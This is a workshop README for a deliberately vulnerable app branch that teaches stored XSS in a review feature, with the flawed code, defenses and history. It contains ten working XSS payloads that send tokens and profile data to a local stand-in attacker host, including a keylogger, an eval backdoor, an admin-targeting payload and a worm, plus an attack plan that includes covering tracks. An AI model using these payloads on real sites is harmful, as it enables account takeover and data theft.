# Persistent (Stored) XSS Vulnerability Demo

## Overview

This branch demonstrates a **Persistent (Stored) Cross-Site Scripting (XSS)** vulnerability in the pilot review feature. Unlike reflected/DOM-based XSS that affects a single victim who clicks a malicious link, persistent XSS affects **every user who views the malicious content**. The attacker stores the malicious payload in the database through the review submission form, and it executes automatically whenever anyone views that review.

## What is Persistent XSS?

Persistent XSS (also called Stored XSS) occurs when user-supplied data is stored in a database, file, or other backend system and later displayed to users without proper sanitization. The malicious script becomes a permanent part of the application's content.

### Why It's More Dangerous

1. **Affects Multiple Victims** - One malicious review affects everyone who views it (customers, pilots, admins)
2. **No Social Engineering Required** - Victims don't need to click a malicious link; just viewing the page triggers the attack
3. **Persistent Threat** - The payload remains active until removed from the database
4. **Privilege Escalation** - When admins or privileged users view the content, their elevated tokens are stolen
5. **Widespread Impact** - In a busy application, a single malicious review could compromise hundreds of users

### Impact

Persistent XSS can lead to:

- **Mass Session Hijacking** - Stealing authentication tokens from all users who view the content
- **Credential Theft** - Installing keyloggers that affect multiple victims
- **Account Takeover** - Using stolen tokens to impersonate users
- **Data Exfiltration** - Stealing sensitive information from all viewers
- **Privilege Escalation** - Compromising admin accounts when they view user content
- **Worm Creation** - Self-propagating attacks that create more malicious reviews

XSS consistently ranks in the OWASP Top 10 Web Application Security Risks.

## The Vulnerability

### Vulnerable Code Locations

**Backend:** `projects/api/src/MBC.Services/PassThroughHtmlSanitizer.cs`

```csharp
public string Sanitize(string original)
{
    _logger.LogDebug("HTML sanitization bypassed - relying on client-side sanitization");
    return original;
}
```

The server accepts any HTML without sanitization, storing malicious scripts directly in the database.

**Frontend:** `projects/web/src/app/shared/ui/rich-text-display.component.ts`

```typescript
trustedHtml = computed<SafeHtml>(() => {
  return this.sanitizer.bypassSecurityTrustHtml(this.content());
});
```

The Angular component uses `bypassSecurityTrustHtml()`, which explicitly tells Angular to skip XSS protection and trust the HTML content unconditionally.

**CSP Configuration:** `projects/web/src/index.html`

```html
<meta
  http-equiv="Content-Security-Policy"
  content="
  script-src 'self' 'unsafe-eval' 'unsafe-inline' http://localhost:4200;
  ...
"
/>
```

The Content Security Policy includes `'unsafe-inline'`, allowing inline event handlers like `onerror`, `onload`, etc.

### How It Works

1. **Attacker submits a review** with malicious HTML/JavaScript in the notes field
2. **Backend stores the payload** without sanitization in the database
3. **Victim views the review** (on pilot profile, delivery details, or review list)
4. **Frontend retrieves the review** from the API
5. **Angular displays it** using `bypassSecurityTrustHtml()`, which disables XSS protection
6. **Browser executes** the malicious JavaScript
7. **Attacker's server receives** stolen tokens/data

**Defense Failures:**

- **Server-side:** `PassThroughHtmlSanitizer` does nothing
- **Client-side:** `bypassSecurityTrustHtml()` explicitly disables Angular's XSS protection
- **CSP:** `'unsafe-inline'` allows inline event handlers, making CSP ineffective

## Attack Samples

All attacks are submitted through the review form's rich text editor. Switch to "Raw HTML" mode (toggle the Wysiwyg switch) and paste these payloads into the notes field.

### 1. Proof of Concept - Basic Alert

**Payload to paste into review notes:**

```html
<img src=x onerror=alert('pwned!')>
```

**Impact:** Displays an alert box to every user who views the review, proving JavaScript execution.

**Why it works:**

- `<img>` tag with invalid `src=x` triggers `onerror` event
- `onerror` handler executes JavaScript
- `PassThroughHtmlSanitizer` allows it through
- `bypassSecurityTrustHtml()` trusts it
- CSP allows inline handlers

---

### 2. Token Exfiltration - Access Token Theft

**Payload to paste into review notes:**

```html
<img
  src="x"
  onerror="fetch('http://localhost:5155/images/stolen.png?token='+localStorage.getItem('mbc_access_token'))"
/>
```

**How it works:**

1. Every user who views this review triggers the `onerror` event
2. JavaScript retrieves their JWT access token from localStorage
3. Sends it to attacker-controlled server (fake-file-host) as query parameter
4. Victim sees the review normally, unaware of the theft

**Impact:** Attacker collects access tokens from all viewers. Can impersonate users for ~15-60 minutes (until tokens expire).

**Affected users:**

- Customers viewing pilot profiles
- Pilots viewing their own reviews
- Admins viewing review reports

---

### 3. Complete Session Hijacking - All Tokens

**Payload to paste into review notes:**

```html
<img
  src="x"
  onerror="fetch('http://localhost:5155/images/session.png?access='+localStorage.getItem('mbc_access_token')+'&refresh='+localStorage.getItem('mbc_refresh_token'))"
/>
```

**How it works:**

1. Steals both access token AND refresh token from every viewer
2. Sends both to attacker's server
3. Attacker can maintain indefinite access by refreshing access tokens

**Impact:** Complete account takeover of every user who views the review. Attacker can:

- Access all victim data
- Make bookings on behalf of victims
- Change user profiles
- Maintain persistent access even after password changes (until refresh token expires, typically 30+ days)

**High-value targets:**

- Admins reviewing reported content
- Pilots checking their ratings
- Customer service staff viewing complaints

---

### 4. User Profile Exfiltration

**Payload to paste into review notes:**

```html
<img
  src="x"
  onerror="fetch('http://localhost:5155/fonts/data.ttf?user='+encodeURIComponent(localStorage.getItem('mbc_user')))"
/>
```

**How it works:**

1. Retrieves serialized user object from localStorage
2. URL-encodes it to handle special characters
3. Sends to attacker disguised as font request (less suspicious in network logs)

**Impact:** Attacker learns about every viewer:

- Full name
- Email address
- User ID
- Role (Customer/Pilot/Admin)
- Any other profile information

**Use cases:**

- Building a target list of high-value accounts
- Social engineering follow-up attacks
- Identifying admins for privilege escalation

---

### 5. Stealth Token Theft - Base64 Encoded

**Payload to paste into review notes:**

```html
<img
  src="x"
  onerror="fetch('http://localhost:5155/styles/app.css?d='+btoa(localStorage.getItem('mbc_access_token')+':'+localStorage.getItem('mbc_refresh_token')))"
/>
```

**How it works:**

1. Combines both tokens with a colon separator
2. Base64 encodes the combined string to obfuscate
3. Sends as CSS request (appears more legitimate in logs)

**Impact:** Same as attack #3 but harder to detect:

- Encoded payload less obvious in logs
- CSS requests appear normal
- Casual log inspection won't reveal tokens

---

### 6. Keylogger Injection

**Payload to paste into review notes:**

```html
<img
  src="x"
  onerror="document.onkeypress=function(e){fetch('http://localhost:5155/scripts/keys.js?k='+e.key)}"
/>
```

**How it works:**

1. Installs a global keylogger on the page
2. Every keystroke from every viewer is sent to attacker's server
3. Persists as long as the page is open

**Impact:** Captures everything users type while viewing the page:

- Passwords (if they re-login in another tab and come back)
- Credit card numbers
- Personal messages
- Search queries
- Form inputs

**Especially dangerous when:**

- Admins keep review pages open while working
- Users multitask with the page in the background
- Mobile users where the page stays in memory

---

### 7. Persistent Backdoor via localStorage

**Payload to paste into review notes:**

```html
<img
  src="x"
  onerror="localStorage.setItem('xss_backdoor','fetch(\'http://localhost:5155/images/steal.png?t=\'+localStorage.getItem(\'mbc_access_token\'))');eval(localStorage.getItem('xss_backdoor'))"
/>
```

**Simplified concept:**

```javascript
// Store malicious code in victim's localStorage
localStorage.setItem("xss_backdoor", "malicious code here");
// Execute it now
eval(localStorage.getItem("xss_backdoor"));
```

**How it works:**

1. First view: Stores malicious code in victim's localStorage AND executes it
2. If attacker can trigger execution again (another XSS, or victim revisits), backdoor runs
3. Creates persistence across page reloads

**Impact:** Turns a one-time XSS into a persistent threat on victim's browser.

---

### 8. Silent Token Refresh Loop

**Payload to paste into review notes:**

```html
<img
  src="x"
  onerror="setInterval(function(){fetch('http://localhost:5155/images/heartbeat.png?t='+localStorage.getItem('mbc_access_token'))},30000)"
/>
```

**How it works:**

1. Sends current access token to attacker every 30 seconds
2. If user gets a new token (after refresh), attacker gets that too
3. Runs silently in the background as long as page is open
4. Affects every viewer continuously

**Impact:**

- Continuous monitoring of all viewers' sessions
- Catches token refreshes automatically
- Multiple users simultaneously monitored
- Long-running pages leak tokens repeatedly

---

### 9. Targeted Admin Attack

**Payload to paste into review notes:**

```html
<img
  src="x"
  onerror="if(localStorage.getItem('mbc_user')&&JSON.parse(localStorage.getItem('mbc_user')).role==='Admin'){fetch('http://localhost:5155/images/admin.png?token='+localStorage.getItem('mbc_access_token')+'&user='+localStorage.getItem('mbc_user'))}"
/>
```

**How it works:**

1. Checks if the viewer is an Admin
2. Only exfiltrates data if viewer has Admin role
3. Sends both token and full user profile

**Impact:**

- Specifically targets high-value accounts
- Avoids detection by not attacking regular users
- Admin tokens provide elevated privileges
- Attacker gains full system access

**Attack scenario:**

1. Attacker submits review with 1-star rating and offensive language
2. Customer service or admin reviews the flagged content
3. Admin token is stolen
4. Attacker gains full system access

---

### 10. Multi-Stage Worm Attack

**Payload to paste into review notes:**

```html
<img
  src="x"
  onerror="fetch('http://localhost:5110/api/reviews',{method:'POST',headers:{'Authorization':'Bearer '+localStorage.getItem('mbc_access_token'),'Content-Type':'application/json'},body:JSON.stringify({deliveryId:'[DELIVERY_ID]',rating:5,notes:'<img src=x onerror=alert(1)>'})})"
/>
```

**How it works:**

1. When victim views the malicious review, it automatically posts a new review on their behalf
2. The new review contains the same malicious payload
3. Creates a self-propagating worm effect

**Impact:**

- Attack spreads automatically without attacker intervention
- Each infected user creates more malicious content
- Rapidly compromises entire user base
- Difficult to contain once started

---

## Real-World Attack Scenario

### Step 1: Reconnaissance

Attacker creates a legitimate account as a customer and books a delivery to test the review system.

### Step 2: Identify Vulnerability

Attacker discovers the rich text editor allows raw HTML input and tests with basic XSS payloads.

### Step 3: Craft Exploit

Creates a malicious review targeting admin tokens (Attack #9 above).

### Step 4: Submit Malicious Review

- Books a real delivery with a pilot
- After delivery completes, submits a 1-star review with offensive content
- Includes the admin-targeting XSS payload in the notes
- Offensive content ensures admins will review it

### Step 5: Wait for Victims

**Multiple attack vectors:**

- **Pilot views their reviews** → Pilot token stolen
- **Customer service investigates complaint** → Support token stolen
- **Admin moderates reported content** → Admin token stolen (jackpot!)
- **Other customers check pilot ratings** → Customer tokens stolen

### Step 6: Exploit Stolen Credentials

With stolen admin token:

- Access all user data
- View all deliveries
- Modify system settings
- Create backdoor admin accounts
- Exfiltrate entire database
- Install persistent backdoors

### Step 7: Cover Tracks

- Use stolen admin token to delete malicious review
- Logs show the admin "deleted their own content"
- Attacker maintains access through refresh tokens
- Breach goes undetected for weeks

## Why This Vulnerability Pattern Exists

### 1. Misunderstanding Framework Security

```typescript
// Developer thinks: "bypassSecurityTrust* must be the secure way to trust content"
this.sanitizer.bypassSecurityTrustHtml(userContent);
```

The name suggests it's making things secure, but it actually **disables** all security checks.

### 2. "Someone Else Will Handle It" Syndrome

```csharp
// Backend: "Frontend will sanitize it"
return original; // No sanitization

// Frontend: "Backend must have sanitized it"
bypassSecurityTrustHtml(content) // Trusts backend
```

Each layer assumes the other is handling security. Result: neither does.

### 3. Feature Requirements Override Security

Product manager: "We need rich text formatting in reviews!"
Developer: "I'll just bypass the security restrictions to make it work."

Time pressure and lack of security knowledge leads to dangerous shortcuts.

### 4. Copy-Paste Programming

Developer searches: "How to display HTML in Angular"
Finds Stack Overflow answer using `bypassSecurityTrustHtml()`
Copies without reading security warnings in the documentation.

### 5. Testing with Safe Data

Developers test with: `<p>Great service!</p>`
This works fine, so they assume it's safe.
Never test with: `<img src=x onerror=alert(1)>`

### 6. Incomplete Code Reviews

Reviewer sees: "We're using DomSanitizer from Angular - must be secure!"
Misses that `bypassSecurityTrustHtml()` does the opposite of sanitizing.

## Defense Strategies

### 1. Never Bypass Framework Security

```typescript
// ❌ NEVER DO THIS
this.sanitizer.bypassSecurityTrustHtml(userInput);

// ✅ DO THIS - Trust Angular's automatic sanitization
<div [innerHTML]="userInput"></div>
```

Angular automatically sanitizes `innerHTML` bindings. Only bypass when you have **complete control** over the content (e.g., static HTML from your own codebase, not from users).

### 2. Server-Side Sanitization (Defense in Depth)

```csharp
// ✅ Use a proper HTML sanitizer
using Ganss.Xss;

public string Sanitize(string html)
{
    var sanitizer = new HtmlSanitizer();
    sanitizer.AllowedTags.Clear();
    sanitizer.AllowedTags.Add("p");
    sanitizer.AllowedTags.Add("br");
    sanitizer.AllowedTags.Add("strong");
    sanitizer.AllowedTags.Add("em");
    // Only allow safe tags, no scripts or event handlers
    return sanitizer.Sanitize(html);
}
```

### 3. Proper CSP Configuration

```html
<!-- ❌ Weak CSP -->
<meta
  http-equiv="Content-Security-Policy"
  content="script-src 'self' 'unsafe-inline'"
/>

<!-- ✅ Strong CSP -->
<meta http-equiv="Content-Security-Policy" content="script-src 'self'" />
```

Remove `'unsafe-inline'` to block inline event handlers (`onerror`, `onload`, etc.).

### 4. Input Validation

```typescript
// Validate on submission
if (containsScriptTags(reviewNotes)) {
  throw new Error("Invalid content");
}
```

Reject obviously malicious input at submission time.

### 5. Output Encoding

Even with sanitization, encode HTML entities:

- `<` becomes `&lt;`
- `>` becomes `&gt;`
- `"` becomes `&quot;`

### 6. Content Security Policy Headers (Server-Side)

```csharp
// In ASP.NET Core
app.Use(async (context, next) =>
{
    context.Response.Headers.Add(
        "Content-Security-Policy",
        "default-src 'self'; script-src 'self'"
    );
    await next();
});
```

Don't rely only on meta tags - set CSP headers server-side.

### 7. Regular Security Audits

- **Automated scanning:** Use tools like Burp Suite, OWASP ZAP
- **Manual testing:** Test all user input fields with XSS payloads
- **Code review:** Search for `bypassSecurityTrust*` and `innerHTML`
- **Penetration testing:** Hire external security experts

### 8. Security Headers

```
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
```

### 9. Principle of Least Privilege

If you must allow HTML:

- Allow only specific safe tags (`<p>`, `<strong>`, `<em>`)
- Strip all attributes except specific safe ones
- Block all JavaScript-capable tags and attributes
- Use a well-tested sanitization library

## Testing the Vulnerability

### Setup

1. Ensure you're on the `vulnerability/xss-persistent` branch
2. Start the API: `dotnet run` (from `projects/api/src/MBC.Endpoints`)
3. Start the web app: `npm start` (from `projects/web`)
4. Start the fake file host: `dotnet run` (from `projects/fake-file-host`)
5. Navigate to: `http://localhost:4200`
6. Sign in as **Customer** (username: `customer@example.com`, password: `Password123!`)

### Book a Delivery (Required to leave a review)

1. Click "Book Delivery" from the home page
2. Fill in delivery details
3. Submit booking
4. Note the delivery ID from the confirmation page

### Mark Delivery as Complete (So you can review it)

You need the delivery to be in "Delivered" status to leave a review:

1. Sign out
2. Sign in as **Pilot** (username: `pilot@example.com`, password: `Password123!`)
3. Go to "My Deliveries"
4. Find your delivery and mark it through the workflow: Picked Up → In Transit → Delivered
5. Sign out

### Execute Attack

1. Sign in as **Customer** again
2. Go to "My Deliveries"
3. Click on your delivered shipment
4. Click "Leave a Review"
5. Set rating to 1 star
6. Toggle the Wysiwyg switch to OFF (raw HTML mode)
7. Paste one of the attack payloads (try #2 - Token Exfiltration first)
8. Submit the review

### Verify Exfiltration (As the attacker)

Check the fake file host console (where you ran `dotnet run`). You'll see:

```
=== DATA EXFILTRATION ATTEMPT DETECTED ===
Timestamp: 2024-11-10 18:23:45 UTC
Full URL: http://localhost:5155/images/stolen.png?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

The token in the URL is the customer's JWT access token - stolen from themselves on first view.

### Observe Multi-Victim Impact

1. Sign in as **Pilot** (the pilot who delivered the shipment)
2. View "My Reviews" or check the delivery details
3. Check fake file host console - pilot's token is now stolen too!
4. Sign in as **Admin** (username: `admin@example.com`, password: `Password123!`)
5. View the review (simulate admin moderating content)
6. Check fake file host console - admin token is now stolen!

**This demonstrates the "persistent" nature:** One malicious review compromises every viewer.

## Comparing Persistent XSS vs. DOM-Based XSS

| Aspect                 | Persistent XSS (This Demo)     | DOM-Based XSS                     |
| ---------------------- | ------------------------------ | --------------------------------- |
| **Storage**            | Stored in database             | Never stored, exists only in URL  |
| **Attack Vector**      | Submit malicious data          | Malicious link                    |
| **Victim Count**       | Everyone who views the content | One victim per click              |
| **Social Engineering** | Not required                   | Required (victim must click link) |
| **Persistence**        | Remains until removed from DB  | Disappears after page closes      |
| **Detection**          | Can be found by scanning DB    | Only detectable at runtime        |
| **Impact Scope**       | Organization-wide              | Individual user                   |
| **Severity**           | Higher (CVSS 8-10)             | Medium-High (CVSS 6-8)            |

## Famous Persistent XSS Attacks

### 1. **2005 - MySpace Samy Worm**

- **Impact:** Infected over 1 million MySpace profiles in 20 hours
- **Method:** Persistent XSS in profile page created self-propagating worm
- **Details:** Each infected profile automatically infected visitors
- **Result:** MySpace was forced to shut down temporarily
- **Legal:** Attacker convicted under computer fraud laws
- **Source:** [Wikipedia: Samy (computer worm)](<https://en.wikipedia.org/wiki/Samy_(computer_worm)>)

### 2. **2015 - eBay Persistent XSS**

- **Impact:** Millions of users potentially affected
- **Method:** XSS in product listings allowed JavaScript injection
- **Details:** Attackers created auction listings with embedded scripts
- **Duration:** Vulnerability existed for months before discovery
- **Source:** [Check Point Research](https://blog.checkpoint.com/)

### 3. **2018 - British Airways Breach (Magecart)**

- **Impact:** 380,000 payment card details stolen, £20 million fine
- **Method:** Persistent XSS injected payment card skimmer
- **Details:** JavaScript injected into checkout page logged all form inputs
- **Cost:** £183 million GDPR fine (later reduced to £20 million)
- **Source:** [BBC News](https://www.bbc.com/news/technology-54568784)

### 4. **2019 - Fortnite Account Takeover**

- **Impact:** 200+ million Fortnite accounts at risk
- **Method:** Multiple XSS vulnerabilities including persistent XSS
- **Details:** Attackers could hijack accounts via malicious forum posts
- **Disclosure:** Responsibly disclosed by Check Point Research
- **Source:** [Check Point Blog](https://research.checkpoint.com/2019/fortnite-a-win-for-cyber-criminals/)

### 5. **2020 - Shopify Stored XSS**

- **Impact:** Millions of e-commerce stores affected
- **Method:** Persistent XSS in product description fields
- **Details:** Merchants could inject scripts that affected customers
- **Bounty:** $20,000 paid to researcher who discovered it
- **Source:** [HackerOne Disclosed Reports](https://hackerone.com/)

### 6. **2021 - Steam Community XSS**

- **Impact:** Millions of Steam users at risk
- **Method:** Stored XSS in user profiles and forum posts
- **Details:** Could steal Steam account credentials and inventory
- **Value:** Steam inventories can be worth thousands of dollars
- **Source:** [Steam Security Advisories](https://store.steampowered.com/)

### 7. **2022 - WordPress Plugin Vulnerabilities**

- **Impact:** Thousands of websites compromised
- **Method:** Persistent XSS in popular WordPress plugins
- **Details:** Comment forms and custom fields allowed script injection
- **Scale:** Some vulnerable plugins had 1M+ installations
- **Source:** [Wordfence Intelligence](https://www.wordfence.com/)

## Resources and Further Reading

### Official Documentation

- [OWASP: Stored XSS](https://owasp.org/www-community/attacks/xss/#stored-xss-attacks)
- [OWASP: XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [CWE-79: Cross-site Scripting (XSS)](https://cwe.mitre.org/data/definitions/79.html)
- [Angular Security Guide](https://angular.dev/best-practices/security)
- [MDN: innerHTML Security](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#security_considerations)

### Educational Resources

- [PortSwigger: Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored)
- [OWASP XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
- [Google XSS Game](https://xss-game.appspot.com/)
- [HackTheBox: XSS Labs](https://www.hackthebox.com/)

### Testing Tools

- [Burp Suite](https://portswigger.net/burp) - Web vulnerability scanner
- [OWASP ZAP](https://www.zaproxy.org/) - Free security testing tool
- [XSStrike](https://github.com/s0md3v/XSStrike) - Advanced XSS detection
- [DOMPurify](https://github.com/cure53/DOMPurify) - XSS sanitizer library

### Sanitization Libraries

- **JavaScript/TypeScript:** DOMPurify
- **.NET:** HtmlSanitizer (Ganss.Xss)
- **Python:** Bleach
- **PHP:** HTML Purifier
- **Java:** OWASP Java HTML Sanitizer

### Content Security Policy

- [MDN: Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)
- [CSP Quick Reference](https://content-security-policy.com/)

## License Note

This vulnerable code is for **educational purposes only**. Never deploy vulnerable code to production environments. The fake-file-host project simulates an attacker's server for demonstration purposes only.

## Contributing to the Workshop

If you discover additional attack vectors or have suggestions for improving this educational material, please contribute! This project aims to teach secure coding practices through realistic examples.
